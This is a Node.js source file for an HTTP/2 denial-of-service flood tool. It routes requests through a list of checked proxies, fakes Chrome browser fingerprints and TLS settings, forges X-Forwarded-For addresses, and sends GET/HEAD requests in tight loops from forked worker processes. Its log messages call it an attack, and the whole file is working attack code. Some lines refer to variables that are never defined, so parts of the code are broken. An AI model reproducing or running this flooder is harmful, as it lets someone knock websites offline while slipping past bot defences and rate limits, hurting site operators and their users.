// npm install colors
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
  defaultCiphers[2],
  defaultCiphers[1],
  defaultCiphers[0],
  ...defaultCiphers.slice(3)
].join(":");
function getRandomTLSCiphersuite() {
  const tlsCiphersuites = [
    'TLS_AES_128_CCM_8_SHA256',
    'TLS_AES_128_CCM_SHA256',
    'TLS_AES_256_GCM_SHA384',
    'TLS_AES_128_GCM_SHA256',
  ];

  const randomCiphersuite = tlsCiphersuites[Math.floor(Math.random() * tlsCiphersuites.length)];

  return randomCiphersuite;
}

const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const language_header = [
  "en-US,en;q=0.8",
  "en-US,en;q=0.5",
  "en-US,en;q=0.9",
  "en-US,en;q=0.7",
  "en-US,en;q=0.6",

  //Chinese
  "zh-CN,zh;q=0.8",
  "zh-CN,zh;q=0.5",
  "zh-CN,zh;q=0.9",
  "zh-CN,zh;q=0.7",
  "zh-CN,zh;q=0.6",

  //Spanish
  "es-ES,es;q=0.8",
  "es-ES,es;q=0.5",
  "es-ES,es;q=0.9",
  "es-ES,es;q=0.7",
  "es-ES,es;q=0.6",

  //French
  "fr-FR,fr;q=0.8",
  "fr-FR,fr;q=0.5",
  "fr-FR,fr;q=0.9",
  "fr-FR,fr;q=0.7",
  "fr-FR,fr;q=0.6",

  //German
  "de-DE,de;q=0.8",
  "de-DE,de;q=0.5",
  "de-DE,de;q=0.9",
  "de-DE,de;q=0.7",
  "de-DE,de;q=0.6",

  //Italian
  "it-IT,it;q=0.8",
  "it-IT,it;q=0.5",
  "it-IT,it;q=0.9",
  "it-IT,it;q=0.7",
  "it-IT,it;q=0.6",

  //Japanese
  "ja-JP,ja;q=0.8",
  "ja-JP,ja;q=0.5",
  "ja-JP,ja;q=0.9",
  "ja-JP,ja;q=0.7",
  "ja-JP,ja;q=0.6",

  //En + Russian
  "en-US,en;q=0.8,ru;q=0.6",
  "en-US,en;q=0.5,ru;q=0.3",
  "en-US,en;q=0.9,ru;q=0.7",
  "en-US,en;q=0.7,ru;q=0.5",
  "en-US,en;q=0.6,ru;q=0.4",

  //En + Chinese
  "en-US,en;q=0.8,zh-CN;q=0.6",

  //En + Spanish
  "en-US,en;q=0.8,es-ES;q=0.6",

  //En + French
  "en-US,en;q=0.8,fr-FR;q=0.6",

  //En + German
  "en-US,en;q=0.8,de-DE;q=0.6",
];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const sigalgs = [
  'ecdsa_secp256r1_sha256',
  'ecdsa_secp384r1_sha384',
  'ecdsa_secp521r1_sha512',
  'rsa_pss_rsae_sha256',
  'rsa_pss_rsae_sha384',
  'rsa_pss_rsae_sha512',
  'rsa_pkcs1_sha256',
  'rsa_pkcs1_sha384',
  'rsa_pkcs1_sha512',
]
let SignalsList = sigalgs.join(':')
const ecdhCurve = "GREASE:X25519:x25519:P-256:P-384:P-521:X448";
const secureOptions =
  crypto.constants.SSL_OP_NO_SSLv2 |
  crypto.constants.SSL_OP_NO_SSLv3 |
  crypto.constants.SSL_OP_NO_TLSv1 |
  crypto.constants.SSL_OP_NO_TLSv1_1 |
  crypto.constants.ALPN_ENABLED |
  crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
  crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
  crypto.constants.SSL_OP_LEGACY_SERVER_CONNECT |
  crypto.constants.SSL_OP_COOKIE_EXCHANGE |
  crypto.constants.SSL_OP_PKCS1_CHECK_1 |
  crypto.constants.SSL_OP_PKCS1_CHECK_2 |
  crypto.constants.SSL_OP_SINGLE_DH_USE |
  crypto.constants.SSL_OP_SINGLE_ECDH_USE |
  crypto.constants.SSL_OP_NO_RENEGOTIATION |
  crypto.constants.SSL_OP_NO_TICKET |
  crypto.constants.SSL_OP_NO_COMPRESSION |
  crypto.constants.SSL_OP_NO_RENEGOTIATION |
  crypto.constants.SSL_OP_TLSEXT_PADDING |
  crypto.constants.SSL_OP_ALL |
  crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION;
if (process.argv.length < 6) { console.log(`Usage: host time req thread proxy.txt --debug`); process.exit(); }
const secureProtocol = "TLS_method";

const statusCodes = {};
let shouldPrint = false;

function printStatusCodes() {
  if (debugMode && shouldPrint) {
    console.log("(node/flood) :", statusCodes);
    shouldPrint = false;
    for (const code in statusCodes) {
      statusCodes[code] = 0;
    }
  }
}

setInterval(printStatusCodes, 1000);

const secureContextOptions = {
  ciphers: ciphers,
  sigalgs: SignalsList,
  honorCipherOrder: true,
  secureOptions: secureOptions,
  secureProtocol: secureProtocol
};
const secureContext = tls.createSecureContext(secureContextOptions);
const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  threads: ~~process.argv[4],
  Rate: ~~process.argv[5],
  proxyFile: process.argv[6],
}
const debugMode = process.argv.includes('--debug');

function checkProxyAlive(proxy, callback) {
  const parts = proxy.replace("socks5://", "").replace("http://", "").split(":");
  const host = parts[0];
  const port = parseInt(parts[1]);

  const socket = new net.Socket();
  socket.setTimeout(5000);

  socket.on('connect', function() {
    socket.destroy();
    callback(true);
  }).on('error', function() {
    callback(false);
  }).on('timeout', function() {
    socket.destroy();
    callback(false);
  }).connect(port, host);
}

function validateProxies(proxies, done) {
  let aliveProxies = [];
  let checked = 0;

  if (proxies.length === 0) return done([]);

  proxies.forEach(proxy => {
    checkProxyAlive(proxy, (isAlive) => {
      if (isAlive) aliveProxies.push(proxy);
      checked++;
      if (checked === proxies.length) {
        done(aliveProxies);
      }
    });
  });
}

// CHECK PROXY xem có die chưa!!
var proxies = readLines(args.proxyFile);

validateProxies(proxies, function(alive) {
  if (alive.length === 0) {
    console.log('[ X ]  Proxy Die All');
    process.exit(1);
  } else {
    console.log(`[OK] U Have  ${alive.length} Proxy Alive  . Start Attack`);
    proxies = alive;
    // Chỉ chạy một lần duy nhất
    runFlooder();
  }
});
// --- KẾT THÚC KHỐI KIỂM TRA PROXY MỚI ---


const parsedTarget = url.parse(args.target);

const MAX_RAM_PERCENTAGE = 95;
const RESTART_DELAY = 1000;

if (cluster.isMaster) {
  console.log(`[INFO] HTTP-FLOOD starting...`);
  console.log(`[INFO] Target: ${args.target}`);
  console.log(`[INFO] Duration: ${args.time} seconds`);
  console.log(`[INFO] Threads: ${args.threads}`);
  console.log(`[INFO] Proxy file: ${args.proxyFile}`);
  console.log(`[INFO] Debug Mode: ${debugMode ? 'ON' : 'OFF'}`);
  const restartScript = () => {
    for (const id in cluster.workers) {
      cluster.workers[id].kill();
    }

    console.log('[>] Restarting the script', RESTART_DELAY, 'ms...');
    setTimeout(() => {
      for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
      }
    }, RESTART_DELAY);
  };

  const handleRAMUsage = () => {
    const totalRAM = os.totalmem();
    const usedRAM = totalRAM - os.freemem();
    const ramPercentage = (usedRAM / totalRAM) * 100;

    if (ramPercentage >= MAX_RAM_PERCENTAGE) {
      console.log('[!] Maximum RAM usage:', ramPercentage.toFixed(2), '%');
      restartScript();
    }
  };
  setInterval(handleRAMUsage, 5000);

  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork();
  }
} else { setInterval(runFlooder) }

class NetSocket {
  constructor() { }

  HTTP(options, callback) {
    const parsedAddr = options.address.split(":");
    const addrHost = parsedAddr[0];
    const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n"; //Keep Alive
    const buffer = new Buffer.from(payload);
    const connection = net.connect({
      host: options.host,
      port: options.port,
    });

    connection.setTimeout(options.timeout * 600000);
    connection.setKeepAlive(true, 600000);
    connection.setNoDelay(true)
    connection.on("connect", () => {
      connection.write(buffer);
    });

    connection.on("data", chunk => {
      const response = chunk.toString("utf-8");
      const isAlive = response.includes("HTTP/1.1 200");
      if (isAlive === false) {
        connection.destroy();
        return callback(undefined, "error: invalid response from proxy server");
      }
      return callback(connection, undefined);
    });

    connection.on("timeout", () => {
      connection.destroy();
      return callback(undefined, "error: timeout exceeded");
    });

  }
}
function getRandomInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

var signature_0x1 = getRandomInt(130, 133);
var signature_0x2 = getRandomInt(80, 99);
var signature_0x3 = getRandomInt(70, 99);
const randomValue = Math.random(); function randstra(length) {
  const characters = "0123456789";
  let result = "";
  const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * charactersLength));
  }
  return result;
}
const user_agent = randomValue < 0.5 ? `Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.${signature_0x2}.${signature_0x3} Safari/537.36` : randomValue < 0.66 ? `Mozilla/5.0 (Macintosh; Intel Mac OS X 1${randstra(1)}_${randstra(1)}_${randstra(1)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.${signature_0x2}.${signature_0x3} Safari/537.36` : `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${signature_0x1}.0.${signature_0x2}.${signature_0x3} Safari/537.36`;

const u = [
  user_agent,
];
function parse_headers(user_agent) {
  const osRegex = /\(([^)]+)\)/;
  const chromeRegex = /Chrome\/(\d+)/;

  const osMatch = user_agent.match(osRegex);
  const chromeMatch = user_agent.match(chromeRegex);

  let os = 'Windows';
  if (osMatch) {
    const osDetails = osMatch[1];
    if (osDetails.includes('Macintosh')) {
      os = 'macOS';
    } else if (osDetails.includes('Linux')) {
      os = 'Linux';
    } else if (osDetails.includes('Windows')) {
      os = 'Windows'
    }
  }

  const chromeVersion = chromeMatch ? parseInt(chromeMatch[1], 10) : 130;

  return { os: os, version: chromeVersion };
}
let chromium = parse_headers(user_agent)
const ngu = ` ${chromium.os}`;

const Socker = new NetSocket();

function readLines(filePath) {
  return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
  return elements[randomIntn(0, elements.length)];
}
function randstrs(length) {
  const characters = "0123456789";
  const charactersLength = characters.length;
  const randomBytes = crypto.randomBytes(length);
  let result = "";
  for (let i = 0; i < length; i++) {
    const randomIndex = randomBytes[i] % charactersLength;
    result += characters.charAt(randomIndex);
  }
  return result;
}
const randstrsValue = randstrs(10);
function runFlooder() {
  const proxyAddr = randomElement(proxies);
  const parsedProxy = proxyAddr.split(":");
  const parsedPort = parsedTarget.protocol == "https:" ? "443" : "80";
  let interval
  interval = 1;
  function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
  }
  const uap = u[Math.floor(Math.random() * u.length)];

  let headers = {
    ":authority": parsedTarget.host,
    ":method": Math.random() > 0.5 ? "GET" : "HEAD",
    "x-forwarded-for": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
    'priority': `u=${getRandomInt(0, 5)}, i`,
    "accept-language": language_header[Math.floor(Math.random() * language_header.length)],
    "accept-encoding": "gzip, br",
    "Accept": accept_header[Math.floor(Math.random() * accept_header.length)],
    ":path": parsedTarget.path + `?v=${randstr(10)}&timestamp=${Date.now()}`,  // Th�m tham s? ng?u nhi�n v�o URL
    ":scheme": "https",
    "sec-ch-ua-platform": ngu,
    "cache-control": Math.random() > 0.5 ? "no-cache" : "no-store",
    "Pragma": "no-cache",
    "sec-ch-ua": `\"Google Chrome\";v=\"${signature_0x1}\", \"Not=A?Brand\";v=\"24\", \"Chromium\";v=\"${signature_0x1}\"`,
    "sec-ch-mobile": "?0",
    "sec-fetch-dest": "document",
    "sec-fetch-mode": "navigate",
    "sec-fetch-site": Math.random() > 0.5 ? "same-origin" : "none",
    "sec-fetch-user": "?1",
    "user-agent": uap,
    "Upgrade-Insecure-Requests": "1",
    "Origin": "https://www.google.com/" + "?page=" + randstr(15) + "-" + randstr(3) + "&" + randstr(6) + "&r=" + Math.random().toString(36).substring(7),
    "Referer": "https://www.google.com/" + "?page=" + randstr(15) + ":" + randstr(9) + "&" + "https://" + parsedTarget.host + "&ref=" + randstr(10),
    "X-Cache": `---ccc------conccccc---diema------ERROR-404-${Math.floor(Math.random() * 100000)}`,
    "X-Cache-LiteSpeed": "LiteSpeed" + "V." + randstr(15),
  };
  const proxyOptions = {
    host: parsedProxy[0],
    port: ~~parsedProxy[1],
    address: parsedTarget.host + ":443",
    ":authority": parsedTarget.host,
    timeout: 15
  };
  Socker.HTTP(proxyOptions, (connection, error) => {
    if (error) return

    connection.setKeepAlive(true, 60000);
    connection.setNoDelay(true)

    const settings = {
      enablePush: false,
      initialWindowSize: 1073741823,
    };

    const tlsOptions = {
      port: parsedPort,
      secure: true,
      ALPNProtocols: [
        "h2"
      ],
      ciphers: ciphers,
      sigalgs: sigalgs,
      socket: connection,
      ecdhCurve: ecdhCurve,
      secureOptions: secureOptions,
      secureContext: secureContext,
      requestCert: true,
      honorCipherOrder: false,
      rejectUnauthorized: false,
      host: parsedTarget.host,
      servername: parsedTarget.host,
      secureProtocol: secureProtocol
    };
    const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

    tlsConn.allowHalfOpen = true;
    tlsConn.setNoDelay(true);
    tlsConn.setKeepAlive(true, 60000);
    tlsConn.setMaxListeners(0);

    const client = http2.connect(parsedTarget.href, {
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 1000,
        initialWindowSize: 6291456,
        maxHeaderListSize: 262144,
        enablePush: false
      },
      maxSessionMemory: 3333,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsConn,
      socket: connection,
    });
    client.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      maxFrameSize: 40000,
      enablePush: false
    });

    client.setMaxListeners(0);
    client.settings(settings);
    client.on("connect", () => {
      const IntervalAttack = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const dynHeaders = {
            ...headers,
            "x-forwarded-proto": "https",
          }
          const request = client.request(dynHeaders)
            .on("response", response => {
              const statusCode = response[":status"];
              if (statusCode) {
                statusCodes[statusCode] = (statusCodes[statusCode] || 0) + 1;
                shouldPrint = true;
              }
              if (response[":status"] === 403) {
                new Promise((resolve, reject) => {
                  request.on('end', resolve);
                  request.on('error', reject);
                });

                delete client;
                delete tlsConn;
                delete uap;
              }
              if (response[":status"] === 429) {
                const currentTime = Date.now();
                args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                (() => {
                  const currentTime = Date.now();
                  args.Rate = args.Rate.filter(limit => currentTime - limit.timestamp <= 60000);
                })();
                args.Rate.push({ proxyAddr, timestamp: Date.now() });
              }
              request.close();
              request.destroy();
              return
            });
          request.end();

        }
      }, interval);
      return;
    });
    if (streams.length > 0) {
      const streamToReset = streams[0];
      client.rstStream(streamToReset.id, 1);
      return;
    }
    client.on("close", () => {
      client.destroy();
      connection.destroy();
      return
    });
    client.on("timeout", () => {
      client.destroy();
      connection.destroy();
      return
    });
    client.on("error", (error) => {
      client.destroy();
      connection.destroy();
      return
    });
  });
}

const StopScript = () => process.exit(1);
setTimeout(StopScript, args.time * 1000);

process.on('uncaughtException', error => { });
process.on('unhandledRejection', error => { });
const client = http2.connect(parsed.href, clientOptions, function () {
});